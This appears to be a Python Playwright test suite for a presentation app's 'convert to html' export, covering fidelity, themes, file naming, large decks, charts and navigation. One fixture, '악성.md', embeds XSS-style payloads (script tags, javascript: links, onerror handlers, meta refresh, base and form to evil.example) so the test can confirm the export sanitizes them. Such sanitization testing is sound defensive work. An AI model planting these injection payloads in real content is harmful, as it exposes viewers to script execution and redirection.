"""html 로 전환 (D129) — 사용자 시나리오: 예제 발표 전부를 전환해 앱 화면과 같은 글·그림인지, 슬라이드 창의 스타일, 특수 문자 이름·하위 폴더,
악의적인 문서, impress 와 겹치는 이름, 4:3·headingDivider, 넣을 장이 없는 발표, 저장하지 않은 편집, Claude 에게 배치 요청과 그사이 바뀐 문서,
같은 문서를 거듭 전환, 큰 그림, 60장 발표, 보는 화면 크기, 차트 종류, 발표 키, 좁은 칸의 Lectern, 문서로 보기, 보기만 하는 프로젝트, 영어 화면"""
import json
import random
import shutil
import struct
import tempfile
import time
import traceback
import zlib
from pathlib import Path
from urllib.parse import quote

from playwright.sync_api import sync_playwright

from harness import ROOT, check, expect, fails, report, serve, stop, until

base = Path(tempfile.mkdtemp(prefix='lec-impress-sc-'))
proj = base / 'proj'
config = base / 'config'
shutil.copytree(ROOT / 'samples', proj)   # 예제 전체 — 발표가 ../../research 의 그림을 쓴다


def png(w, h, noise=False):
    """PNG 한 장 — noise 면 압축이 안 되는 큰 그림"""
    rng = random.Random(7)
    rows = b''.join(b'\x00' + (rng.randbytes(w * 3) if noise else bytes([200, 120, 40]) * w) for _ in range(h))
    chunk = lambda kind, data: struct.pack('>I', len(data)) + kind + data + struct.pack('>I', zlib.crc32(kind + data) & 0xffffffff)
    return b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)) + chunk(b'IDAT', zlib.compress(rows, 1)) + chunk(b'IEND', b'')


FM = '---\nmarp: true\n---\n\n'
(proj / '작은.png').write_bytes(png(40, 30))
(proj / '악성.md').write_text('''---
marp: true
title: "<script>window.T = 1</script> & 제목 </title>"
---

<!-- _class: lead -->
# 악성 시험

<!-- </div><script>window.N = 1</script> 노트에 심은 글 -->

---

## 원시 HTML

<iframe srcdoc="<script>parent.F = 1</script>"></iframe>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<base href="https://evil.example/">
<form action="https://evil.example/"><button>보내기</button></form>
<a href="javascript:window.J = 1">자바스크립트 링크</a>
<svg width="100" height="30"><a href="javascript:window.S = 1"><text x="0" y="20">SVG 링크</text></a></svg>
<img src="작은.png" onerror="window.E = 1" onload="window.L = 1">
<object data="https://evil.example/x.swf"></object>

---

<style scoped>
section::after { content: "</style><script>window.C = 1</script>"; }
section { background-image: url(https://evil.example/bg.png); }
</style>

## 장별 CSS 에 심은 글

본문

---

## 인터넷 그림

![추적](https://evil.example/track.png)
''', encoding='utf-8')
folder = proj / '발표 자료'
folder.mkdir()
weird = "이름 (최종) & 'v2' #1"
(folder / f'{weird}.md').write_text(FM + '# 특수 문자 이름\n\n---\n\n## 둘째\n', encoding='utf-8')
(proj / '사각.md').write_text('---\nmarp: true\nsize: 4:3\nheadingDivider: 2\n---\n\n# 표지\n\n## 하나\n\n글\n\n## 둘\n\n글\n', encoding='utf-8')
(proj / '숨김만.md').write_text(FM + '<!-- hidden: true -->\n# 숨김\n\n---\n\n<!-- hidden: true -->\n## 또 숨김\n', encoding='utf-8')
(proj / '겹침.md').write_text(FM + '''# Overview

---

## Impress

<div class="step">단계 하나</div>
<div class="notes">가짜 노트</div>
<p class="substep">하나씩 나오지 않는 글</p>
<div id="impress-toolbar">도구 막대인 척</div>

<!-- 진짜 노트 -->

---

## Markdown

## Mermaid
''', encoding='utf-8')
CHART = '{"data": {"values": [{"a": "가", "b": 3}, {"a": "나", "b": 5}]}, "mark": "bar", "encoding": {"x": {"field": "a", "type": "nominal"}, "y": {"field": "b", "type": "quantitative"}}}'
(proj / '차트들.md').write_text(FM + f'''# 차트들

---

<!-- layout: two -->
## Vega-Lite 와 ECharts

::: a
```vega-lite
{CHART}
```
:::

::: b
```echarts
{{"xAxis": {{"type": "category", "data": ["가", "나"]}}, "yAxis": {{"type": "value"}}, "series": [{{"type": "line", "data": [3, 5]}}]}}
```
:::

---

<!-- layout: two -->
## Plotly 와 Graphviz

::: a
```plotly
{{"data": [{{"type": "bar", "x": ["가", "나"], "y": [3, 5]}}]}}
```
:::

::: b
```dot
digraph {{ 시작 -> 끝 }}
```
:::

---

## Mermaid 와 수식

```mermaid
graph LR
  A --> B
```

$$E = mc^2$$

---

## 코드

```python
def hello():
    return "안녕"
```
''', encoding='utf-8')
for n in (1, 2, 3):
    (proj / f'큰-{n}.png').write_bytes(png(1000, 1000, noise=True))
(proj / '큰그림.md').write_text(FM + '\n\n---\n\n'.join(f'## 큰 그림 {n}\n\n![큰 그림](큰-{n}.png)' for n in (1, 2, 3)) + '\n', encoding='utf-8')
long_slides = []
for i in range(60):
    long_slides.append(f'<!-- _class: lead -->\n# {i // 10 + 1}부' if i % 10 == 0 else f'## {i + 1}번째 장\n\n- 글 {i + 1}')
(proj / '긴발표.md').write_text(FM + '\n\n---\n\n'.join(long_slides) + '\n', encoding='utf-8')
(proj / '보고서.md').write_text(FM + '# 보고서\n\n---\n\n## 둘째\n', encoding='utf-8')
(proj / '보고서.html').write_text('<!doctype html><title>내 보고서</title><p>사용자가 만든 html</p>\n', encoding='utf-8')
(proj / '편집.md').write_text(FM + '# 편집 중\n\n---\n\n## 둘째\n', encoding='utf-8')
FLOW = FM + '<!-- _class: lead -->\n# 흐름\n\n---\n\n## 하나\n\n---\n\n## 둘\n\n---\n\n## 셋\n\n---\n\n## 넷\n'
(proj / '흐름.md').write_text(FLOW, encoding='utf-8')

READY = """() => {
  const v = document.querySelector('#lec-view');
  if (!v || !v.classList.contains('lec-deck') || !v.querySelector('.lec-slide-wrap')) return false;
  const waiting = [...v.querySelectorAll('pre.mermaid')].some((p) => !p.querySelector('svg'))
    || [...v.querySelectorAll('pre.lec-chart')].some((p) => !p.querySelector('svg') && !p.classList.contains('diagram-error'));
  return !waiting;
}"""
# 장의 글(단추·꼬리표·스타일 글을 뺀 것)과 그림 수 — 앱 화면과 결과 파일을 같은 식으로 센다
FACTS = """(sel) => {
  const norm = (s) => s.replace(/\\s+/g, ' ').trim();
  const slides = [...document.querySelectorAll(sel)];
  return {
    texts: slides.map((s) => { const c = s.cloneNode(true); c.querySelectorAll('button, .lec-tag, .lec-slide-tags, style, script').forEach((e) => e.remove()); return norm(c.textContent); }),
    mermaid: slides.reduce((n, s) => n + s.querySelectorAll('pre.mermaid svg').length, 0),
    charts: slides.reduce((n, s) => n + s.querySelectorAll('pre.lec-chart svg').length, 0),
    katex: slides.reduce((n, s) => n + s.querySelectorAll('.katex').length, 0),
    imgs: slides.reduce((n, s) => n + s.querySelectorAll('img').length, 0),
    cells: slides.reduce((n, s) => n + s.querySelectorAll('.lec-cell').length, 0),
  };
}"""
APP_SLIDES = '#lec-view > .lec-slide-wrap:not(.lec-hidden) .lec-slide'
FILE_SLIDES = '#impress .lec-step .lec-slide'

server, url, port = serve(proj, config)
servers = []
try:
    with sync_playwright() as p:
        b = p.chromium.launch()
        page = b.new_page(viewport={'width': 1400, 'height': 900})
        page.goto(url)
        page.wait_for_selector('#lec-tree .row.file', timeout=20000)
        page.evaluate("import('/static/js/store.js').then((m) => m.on('term-paste', (text) => { window.__paste = text; }))")
        pid = page.evaluate("import('/static/js/store.js').then((m) => m.S.tab.id)")
        toast = lambda pg: pg.evaluate("document.querySelector('#lec-toast')?.textContent || ''")

        def open_doc(pg, path):
            pg.evaluate("(p) => import('/static/js/store.js').then((m) => m.emit('open', { type: 'doc', path: p }))", path)
            until(pg, f"document.querySelector('#lec-view')?.dataset.docPath === {json.dumps(path)}", 15000)
            until(pg, READY, 30000)
            pg.wait_for_timeout(400)

        def export(pg, mode=None, overview=True):
            """창을 열고 키보드로 만든다. (파일 이름, 알림 글, 걸린 초)"""
            pg.click('#lec-st-html')
            pg.wait_for_selector('#lec-html:not([hidden])', timeout=8000)
            if mode:
                pg.click(f'input[name="lec-html-mode"][value="{mode}"]')
            if not overview:
                pg.uncheck('#lec-html-overview')
            started = time.monotonic()
            pg.keyboard.press('Enter')
            until(pg, "!document.querySelector('#lec-html-done').hidden || document.querySelector('#lec-html-msg').classList.contains('bad')", 60000)
            took = time.monotonic() - started
            summary = pg.text_content('#lec-html-summary') or ''
            msg = pg.text_content('#lec-html-msg') or ''
            pg.keyboard.press('Escape')
            return summary.split(' 을 만들었습니다')[0].split(' was made')[0].strip(), msg, took

        def view(path, size=(1600, 900), js=True, ctx_args=None):
            ctx = b.new_context(viewport={'width': size[0], 'height': size[1]}, java_script_enabled=js, **(ctx_args or {}))
            outside = []
            ctx.route('**/*', lambda route: (outside.append(route.request.url), route.abort()) if not route.request.url.startswith('file:') else route.continue_())
            pg = ctx.new_page()
            errs = []
            pg.on('pageerror', lambda e: errs.append(str(e)[:200]))
            pg.goto(Path(path).as_uri())
            if js:
                until(pg, "document.body.classList.contains('impress-enabled')", 10000)
                pg.wait_for_timeout(300)
            return ctx, pg, outside, errs

        print('[1. 예제 발표를 모두 전환 — 앱 화면과 같은 글·그림]')
        decks = sorted(p.relative_to(proj).as_posix() for p in (proj / 'slides').rglob('*.md') if not p.name.startswith('README')
                       and '---\nmarp: true' in p.read_text(encoding='utf-8').replace('\r\n', '\n')[:300])
        check('예제 발표 26개', len(decks) >= 26, len(decks))
        rows = []
        for rel in decks:
            open_doc(page, rel)
            app = page.evaluate(FACTS, APP_SLIDES)
            name, msg, took = export(page)
            out = proj / Path(rel).parent / name
            if not out.is_file():
                check(f'예제 {rel} — 파일', False, (name, msg))
                continue
            ctx, show, outside, errs = view(out)
            got = show.evaluate(FACTS, FILE_SLIDES)
            steps = show.evaluate("document.querySelectorAll('#impress .step').length")
            imgs = show.evaluate("[...document.querySelectorAll('#impress img')].every((i) => i.src.startsWith('data:') && i.naturalWidth > 0)")
            same = got == app and steps == len(app['texts']) + 1 and not outside and not errs and imgs
            diff = [k for k in app if app[k] != got[k]]
            check(f'예제 {rel}', same, {'다른 것': diff, '장': (steps, len(app['texts'])), '바깥': outside[:2], '오류': errs[:2], '그림': imgs})
            rows.append((rel, len(app['texts']), round(out.stat().st_size / 1024), round(took, 1)))
            ctx.close()
        print('  장·KB·초:', ', '.join(f'{Path(r).stem} {n}장 {kb}KB {s}초' for r, n, kb, s in rows))
        check('예제 하나를 만드는 데 10초를 넘지 않는다', all(r[3] < 10 for r in rows), max(r[3] for r in rows))

        print('[2. 슬라이드 창에서 — 그 창의 스타일로]')
        win = b.new_page(viewport={'width': 1300, 'height': 850})
        deck_path = 'slides/상황별/01-경영-요약.md'
        win.goto(f"{url}?solo={quote(pid)}&w=abcdef0199&type=doc&path={quote(deck_path)}&deck=1")
        win.wait_for_selector('#lec-view.lec-deck', timeout=20000)
        win.select_option('#lec-theme', 'dracula')
        until(win, "document.documentElement.dataset.theme === 'dracula'")
        until(win, READY, 20000)
        win.wait_for_timeout(800)
        app_bg = win.evaluate("getComputedStyle(document.querySelector('#lec-view .lec-slide')).backgroundColor")
        check('슬라이드 창에도 html 로 전환', win.locator('#lec-st-html').is_visible())
        name, msg, _ = export(win)
        ctx, show, outside, errs = view(proj / 'slides' / '상황별' / name)
        check('결과는 슬라이드 창의 스타일', show.evaluate("document.documentElement.dataset.theme") == 'dracula')
        check('장의 바탕색이 화면과 같다', show.evaluate("getComputedStyle(document.querySelector('.lec-slide')).backgroundColor") == app_bg, app_bg)
        check('어두운 스타일의 data-ui', show.evaluate("document.documentElement.dataset.ui") == 'dark')
        ctx.close()
        win.close()

        print('[3. 특수 문자 이름·하위 폴더·제목]')
        open_doc(page, f'발표 자료/{weird}.md')
        name, msg, _ = export(page)
        out = folder / f'{weird}.html'
        check('하위 폴더의 문서 옆에, 같은 이름으로', name == f'{weird}.html' and out.is_file(), (name, msg))
        page.click('#lec-st-html')
        page.wait_for_selector('#lec-html:not([hidden])')
        check('다음 이름', f'{weird} 2.html' in page.text_content('#lec-html-title'))
        page.keyboard.press('Enter')
        until(page, "!document.querySelector('#lec-html-done').hidden", 20000)
        page.click('#lec-html-open')
        page.wait_for_timeout(400)
        check('하위 폴더·특수 문자 이름도 브라우저로 열기를 받는다', '열지' not in toast(page) and 'html' not in toast(page), toast(page))
        page.click('#lec-st-html')
        page.wait_for_selector('#lec-html:not([hidden])')
        page.keyboard.press('Enter')
        until(page, "!document.querySelector('#lec-html-done').hidden", 20000)
        page.click('#lec-html-show')
        page.wait_for_timeout(300)
        check('탐색기에서 보기도 받는다', page.locator('#lec-html').is_hidden() and '못했' not in toast(page), toast(page))

        print('[4. 악의적인 문서 — 받은 사람의 브라우저에서 아무것도 돌지 않는다]')
        # 인터넷 그림은 앱 화면에서 불러온 것으로 (실패하면 앱이 링크로 바꾸므로 점검이 응답을 준다)
        page.route('https://evil.example/**', lambda route: route.fulfill(status=200, content_type='image/png', body=png(20, 20)))
        open_doc(page, '악성.md')
        until(page, "[...document.querySelectorAll('#lec-view img')].some((i) => i.src.startsWith('https://evil.example/') && i.complete && i.naturalWidth > 0)", 8000)
        name, msg, _ = export(page)
        out = proj / name
        text = out.read_text(encoding='utf-8')
        inner = text[text.index('<div id="impress"'):text.index('<div class="impress-progressbar">')]
        check('인터넷 그림이 주소로 남았다고 알린다', '인터넷 그림' in msg, msg)
        check('장 안에 iframe·meta·base·form·object 가 없다', not any(f'<{tag}' in inner.lower() for tag in ('iframe', 'meta', 'base', 'form', 'object', 'script')))
        check('장 안에 javascript: 와 이벤트 속성이 없다', 'javascript:' not in inner.lower() and ' onerror=' not in inner.lower() and ' onload=' not in inner.lower())
        ctx, show, outside, errs = view(out)
        check('심은 스크립트가 돌지 않는다', show.evaluate("[window.T, window.N, window.F, window.J, window.S, window.E, window.L, window.C].every((v) => v === undefined)"))
        check('스크립트는 둘뿐', show.evaluate('document.scripts.length') == 2)
        check('제목은 글자 그대로', show.title() == '<script>window.T = 1</script> & 제목 </title>', show.title())
        check('바깥 요청은 문서의 인터넷 그림뿐', set(outside) <= {'https://evil.example/track.png'}, outside)
        check('페이지가 다른 곳으로 가지 않는다', show.url.startswith('file:'), show.url)
        check('노트의 글은 글로', '<script>' in show.evaluate("document.querySelector('#lec-slide-1 .notes').textContent"))
        show.click('text=자바스크립트 링크')
        show.wait_for_timeout(200)
        check('javascript: 링크를 눌러도 아무 일이 없다', show.evaluate('window.J') is None and show.url.startswith('file:'))
        ctx.close()

        print('[5. impress 와 겹치는 이름 (Overview·Impress·Markdown·Mermaid 제목, class="step"·notes·substep)]')
        open_doc(page, '겹침.md')
        name, msg, _ = export(page)
        ctx, show, outside, errs = view(proj / name)
        check('오류 없이 켜진다', not errs, errs)
        check('문서의 class="step" 은 장이 되지 않는다', show.evaluate("document.querySelectorAll('#impress .step').length") == 4)
        check('노트는 앱이 넣은 것 하나', show.evaluate("[...document.querySelectorAll('#lec-slide-2 .notes')].map((n) => n.textContent.trim())") == ['진짜 노트'])
        check('substep 글도 처음부터 보인다', show.locator('text=하나씩 나오지 않는 글').is_visible())
        check('impress 로 시작하는 id 는 뗀다', show.evaluate("document.querySelectorAll('#impress-toolbar').length") == 0)
        show.keyboard.press('End')
        expect(show, 'Overview 제목이 있어도 End 는 전체 보기', "document.body.classList.contains('impress-on-lec-overview')")
        show.evaluate("location.hash = '#/lec-slide-2'")
        expect(show, '주소의 #/lec-slide-2 로 그 장', "document.querySelector('.step.active')?.id === 'lec-slide-2'")
        with ctx.expect_page(timeout=8000) as info:
            show.keyboard.press('p')
        expect(info.value, '발표자 콘솔의 노트는 진짜 노트', "document.getElementById('notes')?.innerText.includes('진짜 노트') && !document.getElementById('notes')?.innerText.includes('가짜')")
        ctx.close()

        print('[6. 4:3 과 headingDivider]')
        open_doc(page, '사각.md')
        name, msg, _ = export(page)
        ctx, show, outside, errs = view(proj / name)
        sizes = show.evaluate("[...document.querySelectorAll('.lec-step')].map((s) => [s.offsetWidth, s.offsetHeight, +s.dataset.x])")
        check('제목마다 나뉜 세 장', len(sizes) == 3, sizes)
        check('4:3 장은 960×720, 1104 간격', all(w == 960 and h == 720 for w, h, _ in sizes) and [x for *_, x in sizes][:2] == [0, 1104], sizes)
        check('impress 의 캔버스도 960×720', show.evaluate("[document.getElementById('impress').dataset.width, document.getElementById('impress').dataset.height]") == ['960', '720'])
        ctx.close()

        print('[7. 넣을 장이 없는 발표]')
        open_doc(page, '숨김만.md')
        page.click('#lec-st-html')
        page.wait_for_timeout(400)
        check('모두 숨긴 발표는 창을 열지 않고 알린다', page.locator('#lec-html').is_hidden() and '넣을 장이 없습니다' in toast(page), toast(page))

        print('[8. 저장하지 않은 편집]')
        edit = b.new_page(viewport={'width': 1300, 'height': 850})
        edit.goto(url)
        edit.wait_for_selector('#lec-tree .row.file', timeout=20000)
        open_doc(edit, '편집.md')
        edit.keyboard.press('Control+e')
        edit.wait_for_selector('.CodeMirror', timeout=10000)
        edit.locator('.CodeMirror').click()
        edit.keyboard.type('고침 ')
        edit.wait_for_timeout(200)
        if edit.locator('#lec-st-html').is_visible():
            edit.click('#lec-st-html')
            edit.wait_for_timeout(300)
            shown = edit.locator('#lec-html').is_visible()
            check('저장하지 않은 편집이 있으면 전환하지 않고 알린다', not shown and '저장하지 않은' in toast(edit) and not (proj / '편집.html').exists(), (shown, toast(edit)))
        else:
            check('편집하는 동안에는 html 로 전환이 숨는다', not (proj / '편집.html').exists())
        edit.close()

        print('[9. Claude 에게 배치 요청 — 그사이 문서가 바뀌면 창도 따라온다]')
        open_doc(page, '흐름.md')
        page.click('#lec-st-html')
        page.wait_for_selector('#lec-html:not([hidden])')
        check('지도에 다섯 장', page.locator('#lec-html-map rect').count() == 5)
        page.click('#lec-html-ask')
        paste = until(page, 'window.__paste', 5000) or ''
        check('요청 글이 터미널로 간다 — 문서와 작성 안내를 알려 준다', '@흐름.md' in paste and 'slides' in paste and 'impress:' in paste, paste[:160])
        check('요청하면 창을 닫는다', page.locator('#lec-html').is_hidden())
        page.click('#lec-st-html')
        page.wait_for_selector('#lec-html:not([hidden])')
        arranged = FLOW.replace('## 하나\n', '<!-- impress: x=0 y=1000 -->\n## 하나\n').replace('## 둘\n', '<!-- impress: x=1500 y=1000 rotate=90 -->\n## 둘\n') \
            .replace('## 셋\n', '<!-- impress: x=3000 y=1000 scale=2 -->\n## 셋\n').replace('## 넷\n', '<!-- impress: x=4500 y=1000 z=-500 -->\n## 넷\n') + '\n---\n\n## 다섯\n'
        (proj / '흐름.md').write_text(arranged, encoding='utf-8')   # Claude 가 쓴 것처럼
        expect(page, '열어 둔 창의 지도가 새 문서로 — 여섯 장', "document.querySelectorAll('#lec-html-map rect').length === 6", ms=10000)
        check('자리를 적은 장 넷이 표시된다', page.locator('#lec-html-map rect.placed').count() == 4 and '자리를 적은 장 4개' in page.text_content('#lec-html-info'), page.text_content('#lec-html-info'))
        page.keyboard.press('Enter')
        until(page, "!document.querySelector('#lec-html-done').hidden", 20000)
        page.keyboard.press('Escape')
        ctx, show, outside, errs = view(proj / '흐름.html')
        steps = show.evaluate("[...document.querySelectorAll('.lec-step')].map((s) => [+s.dataset.x, +s.dataset.y, +s.dataset.rotate, +s.dataset.scale, +s.dataset.z])")
        check('Claude 가 적은 자리대로', steps[1:5] == [[0, 1000, 0, 1, 0], [1500, 1000, 90, 1, 0], [3000, 1000, 0, 2, 0], [4500, 1000, 0, 1, -500]], steps)
        check('자리를 적지 않은 새 장은 규칙대로', steps[5][:2] == [1472, 936], steps[5])
        ctx.close()
        (proj / '흐름.md').write_text(arranged.replace('x=4500 y=1000 z=-500', 'x=45OO y=1000'), encoding='utf-8')   # 오타 (O)
        issues = until(page, "[...document.querySelectorAll('#lec-view .lec-slide-wrap')].map((w) => w.dataset.issues || '').join(' ').includes('45OO')", 10000)
        check('자리의 오타는 점검이 알린다', issues)
        name, msg, _ = export(page)
        check('오타가 있어도 만든다 (그 축은 규칙대로)', (proj / name).is_file(), (name, msg))

        print('[10. 같은 문서를 거듭 전환 — 사용자의 html 은 그대로]')
        open_doc(page, '보고서.md')
        names = [export(page)[0] for _ in range(3)]
        check('보고서 2·3·4', names == ['보고서 2.html', '보고서 3.html', '보고서 4.html'], names)
        check('원래 있던 보고서.html 은 그대로', (proj / '보고서.html').read_text(encoding='utf-8') == '<!doctype html><title>내 보고서</title><p>사용자가 만든 html</p>\n')

        print('[11. 큰 그림 세 장]')
        open_doc(page, '큰그림.md')
        name, msg, took = export(page)
        out = proj / name
        size = out.stat().st_size
        check('그림이 파일 안에 (12MB 쯤)', size > 10_000_000, size)
        check('30초 안에 만든다', took < 30, took)
        ctx, show, outside, errs = view(out)
        check('큰 그림이 다 보인다', show.evaluate("[...document.querySelectorAll('#impress img')].every((i) => i.naturalWidth === 1000)"))
        ctx.close()

        print('[12. 60장 발표]')
        open_doc(page, '긴발표.md')
        name, msg, took = export(page)
        ctx, show, outside, errs = view(proj / name, size=(1600, 900))
        ys = show.evaluate("[...new Set([...document.querySelectorAll('.lec-step')].map((s) => s.dataset.y))].length")
        check('60장과 전체 보기', show.evaluate("document.querySelectorAll('.step').length") == 61)
        check('부마다 줄을 바꾸고 4장에서 접는다 — 18줄', ys == 18, ys)
        check('20초 안에 만든다', took < 20, took)
        show.keyboard.press('End')
        until(show, "document.body.classList.contains('impress-on-lec-overview')")
        # 줌아웃은 화면 옮기기가 반 박자 늦게 시작해 1.5초에 끝난다 — 고정 시간이 아니라 다 든 것을 기다린다
        expect(show, '전체 보기에 60장이 다 들어온다', "[...document.querySelectorAll('.lec-step')].every((s) => { const r = s.getBoundingClientRect(); return r.left >= -2 && r.top >= -2 && r.right <= innerWidth + 2 && r.bottom <= innerHeight + 2; })", ms=5000)
        ctx.close()

        print('[13. 보는 화면 크기]')
        open_doc(page, '차트들.md')
        name, msg, _ = export(page)
        charts_html = proj / name
        for size in ((1280, 720), (1366, 768), (1920, 1080), (3840, 2160), (390, 844)):
            ctx, show, outside, errs = view(charts_html, size=size)
            r = show.evaluate("(() => { const r = document.querySelector('.step.active .lec-slide').getBoundingClientRect(); return [r.left, r.top, r.right, r.bottom]; })()")
            fits = r[0] >= -1 and r[1] >= -1 and r[2] <= size[0] + 1 and r[3] <= size[1] + 1
            centered = abs((r[0] + r[2]) / 2 - size[0] / 2) < 3 and abs((r[1] + r[3]) / 2 - size[1] / 2) < 3
            check(f'{size[0]}×{size[1]} 에서 장이 화면 안 가운데', fits and centered, [round(x) for x in r])
            ctx.close()

        print('[14. 차트 종류·코드 색]')
        app = page.evaluate(FACTS, APP_SLIDES)
        ctx, show, outside, errs = view(charts_html)
        got = show.evaluate(FACTS, FILE_SLIDES)
        check('Vega-Lite·ECharts·Plotly·Graphviz 넷 다', got['charts'] == app['charts'] == 4, (got['charts'], app['charts']))
        check('Mermaid·수식', got['mermaid'] == 1 and got['katex'] >= 1)
        check('코드 색이 남고 복사 단추는 없다', show.locator('#impress .hljs-keyword').count() > 0 and show.locator('#impress .code-copy').count() == 0)
        check('차트에 "누르면 크게" 안내가 남지 않는다', show.locator('#impress [title]').count() == 0, show.evaluate("[...document.querySelectorAll('#impress [title]')].map((e) => e.title).slice(0, 3)"))

        print('[15. 발표 키·누르기·주소]')
        active = lambda: show.evaluate("document.querySelector('.step.active')?.id")
        show.keyboard.press('Space')
        expect(show, 'Space 로 다음', "document.querySelector('.step.active')?.id === 'lec-slide-2'")
        show.keyboard.press('PageDown')
        expect(show, 'PageDown 으로 다음', "document.querySelector('.step.active')?.id === 'lec-slide-3'")
        show.keyboard.press('ArrowLeft')
        expect(show, '← 로 앞', "document.querySelector('.step.active')?.id === 'lec-slide-2'")
        show.wait_for_timeout(1100)
        box = show.evaluate("(() => { const r = document.getElementById('lec-slide-3').getBoundingClientRect(); return [r.left + r.width / 2, r.top + r.height / 2]; })()")
        if 0 < box[0] < 1600 and 0 < box[1] < 900:
            show.mouse.click(box[0], box[1])
            expect(show, '옆 장을 누르면 그 장으로', "document.querySelector('.step.active')?.id === 'lec-slide-3'")
        show.keyboard.press('Control+End')
        show.wait_for_timeout(200)
        check('Ctrl+End 는 받지 않는다 (수식 키)', active() != 'lec-overview', active())
        ctx.close()
        ctx = b.new_context(viewport={'width': 1280, 'height': 720})
        deep = ctx.new_page()
        deep.goto(charts_html.as_uri() + '#/lec-slide-4')
        expect(deep, '주소의 #/lec-slide-4 로 열면 그 장부터', "document.querySelector('.step.active')?.id === 'lec-slide-4'")
        ctx.close()

        print('[16. 좁은 칸의 Lectern 에서 연 결과]')
        narrow = b.new_page(viewport={'width': 1000, 'height': 800})
        narrow.goto(url)
        narrow.wait_for_selector('#lec-tree .row.file', timeout=20000)
        narrow.evaluate("(p) => import('/static/js/store.js').then((m) => m.emit('open', { type: 'doc', path: p }))", '차트들.html')
        frame = narrow.wait_for_selector('#lec-view iframe', timeout=10000).content_frame()
        frame.wait_for_selector('.lec-step')
        narrow.wait_for_timeout(600)
        width = narrow.evaluate("document.querySelector('#lec-view iframe').getBoundingClientRect().width")
        right = frame.evaluate("Math.max(...[...document.querySelectorAll('.lec-step')].map((s) => s.getBoundingClientRect().right))")
        check('좁은 칸에서도 장이 칸 안에', right <= width + 1, (right, width))
        check('차트·그림이 문서로도 보인다', frame.evaluate("document.querySelectorAll('pre.lec-chart svg').length") == 4)
        narrow.close()

        print('[17. 문서로 보기에서는 버튼이 없다]')
        open_doc(page, '보고서.md')
        page.click('#lec-st-slides')
        until(page, "!document.querySelector('#lec-view').classList.contains('lec-deck')")
        check('문서로 보면 html 로 전환이 숨는다', page.locator('#lec-st-html').is_hidden())
        page.click('#lec-st-slides')
        until(page, "document.querySelector('#lec-view').classList.contains('lec-deck')")
        check('슬라이드로 돌아오면 다시 보인다', page.locator('#lec-st-html').is_visible())

        print('[18. 보기만 하는 프로젝트 (예제)]')
        shipped = sorted((ROOT / 'samples' / 'slides').rglob('*.html'))   # 예제에 든 html 발표 (기초/07)
        s2, url2, _ = serve(ROOT / 'samples', base / 'c2')
        servers.append(s2)
        ro = b.new_page(viewport={'width': 1300, 'height': 850})
        ro.goto(url2)
        ro.wait_for_selector('#lec-tree .row.file', timeout=20000)
        open_doc(ro, 'slides/상황별/01-경영-요약.md')
        ro.click('#lec-st-html')
        ro.wait_for_timeout(400)
        check('예제에서는 만들지 않고 알린다', ro.locator('#lec-html').is_hidden() and '보기만' in toast(ro), toast(ro))
        rid = ro.evaluate("import('/static/js/store.js').then((m) => m.S.tab.id)")
        r = ro.evaluate("""async ([p, path]) => { const r = await fetch('/api/html-export', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ p, path, html: '<!doctype html><meta name="generator" content="Lectern">' }) }); return r.status; }""", [rid, 'slides/상황별/01-경영-요약.md'])
        check('API 도 403', r == 403, r)
        check('예제 폴더에 html 이 생기지 않았다', sorted((ROOT / 'samples' / 'slides').rglob('*.html')) == shipped, shipped)
        ro.close()

        print('[19. 영어 화면]')
        (base / 'c3').mkdir()
        (base / 'c3' / 'config.json').write_text(json.dumps({'language': 'en'}), encoding='utf-8')
        en_proj = base / 'en'
        en_proj.mkdir()
        (en_proj / 'deck.md').write_text(FM + '# Deck\n\n---\n\n## Second\n\n<!-- speaker note -->\n', encoding='utf-8')
        s3, url3, _ = serve(en_proj, base / 'c3')
        servers.append(s3)
        en = b.new_page(viewport={'width': 1300, 'height': 850})
        en.goto(url3)
        en.wait_for_selector('#lec-tree .row.file', timeout=20000)
        open_doc(en, 'deck.md')
        check('상태줄 버튼이 영어', en.locator('#lec-st-html').inner_text().strip() == 'Convert to html', en.locator('#lec-st-html').inner_text())
        en.click('#lec-st-html')
        en.wait_for_selector('#lec-html:not([hidden])')
        hangul = en.evaluate("[...document.querySelectorAll('#lec-html :is(div, p, label, button, span)')].filter((e) => e.offsetParent && /[가-힣]/.test(e.textContent)).map((e) => e.textContent.trim()).slice(0, 4)")
        check('창에 한국어가 남지 않는다', not hangul, hangul)
        en.keyboard.press('Enter')
        until(en, "!document.querySelector('#lec-html-done').hidden", 20000)
        summary = en.text_content('#lec-html-summary')
        check('끝난 알림도 영어', 'deck.html' in summary and not any('가' <= c <= '힣' for c in summary), summary)
        en.keyboard.press('Escape')
        ctx, show, outside, errs = view(en_proj / 'deck.html')
        check('파일의 lang 은 en', show.evaluate('document.documentElement.lang') == 'en')
        ctx.close()
        en.close()
except Exception:
    traceback.print_exc()
    fails.append('예외')
finally:
    for s in servers:
        s.terminate()
    stop(server, base)
report()
